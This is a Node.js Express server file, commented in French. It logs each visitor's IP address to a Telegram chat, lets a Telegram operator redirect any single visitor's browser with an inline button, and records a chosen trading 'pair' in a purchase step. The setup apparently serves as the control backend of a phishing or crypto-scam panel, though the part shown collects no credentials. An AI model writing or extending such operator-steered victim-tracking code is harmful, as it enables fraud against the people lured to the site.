import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import { dirname } from 'path';
import bodyParser from 'body-parser';
import cors from 'cors';
import fetch from 'node-fetch';
import { v4 as uuidv4 } from 'uuid';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const TELEGRAM_API = BOT_TOKEN ? `https://api.telegram.org/bot${BOT_TOKEN}` : null;

if(!BOT_TOKEN || !CHAT_ID) console.warn('⚠️ BOT_TOKEN ou CHAT_ID manquant.');

const sessions = {};

async function sendTelegramNotif(data){
  if(!BOT_TOKEN || !CHAT_ID) return;

  const msg = `🆕 <b>NOUVEL USER</b>\n🆔 Session: ${data.sessionId}\n🌐 IP: ${data.ip}`;
  const keyboard = {
    inline_keyboard: [
      [{ text:'➡️ Aller à la page suivante', callback_data:`next|${data.sessionId}|/index.html` }]
    ]
  };

  await fetch(`${TELEGRAM_API}/sendMessage`,{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode:'HTML', reply_markup:keyboard })
  });
}

// Endpoint visite
app.post('/api/visit', (req,res)=>{
  const sid = uuidv4();
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  sessions[sid] = { data:{ sessionId:sid, ip, page:'Accueil' }, redirect:null };
  sendTelegramNotif(sessions[sid].data);
  res.json({ sessionId:sid });
});

// Endpoint achat
app.post('/api/buy', (req,res)=>{
  const { sessionId, pair } = req.body;
  if(!sessions[sessionId]) return res.status(400).send('Session invalide');
  sessions[sessionId].data.pair = pair;
  sessions[sessionId].data.page = 'Choix Paire';
  sendTelegramNotif(sessions[sessionId].data);
  res.json({ ok:true });
});

// Webhook Telegram pour redirection
app.post('/telegramWebhook', bodyParser.json(), async (req,res)=>{
  const body = req.body;
  if(body.callback_query){
    const cb = body.callback_query;
    const [action,sid,url] = cb.data.split('|');
    if(action==='next' && sessions[sid]){
      sessions[sid].redirect = url;
    }
    await fetch(`${TELEGRAM_API}/answerCallbackQuery`,{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ callback_query_id: cb.id, text:'Action prise' })
    });
  }
  res.sendStatus(200);
});

// Polling front-end pour redirection
app.get('/api/status', (req,res)=>{
  const { sessionId } = req.query;
  if(!sessions[sessionId]) return res.json({});
  res.json({ redirect: sessions[sessionId].redirect || null });
});

app.get('/', (_,res)=>res.sendFile(path.join(__dirname,'public','index.html')));

const PORT = process.env.PORT || 3000;
app.listen(PORT, ()=>console.log(`✅ Serveur prêt sur ${PORT}`));
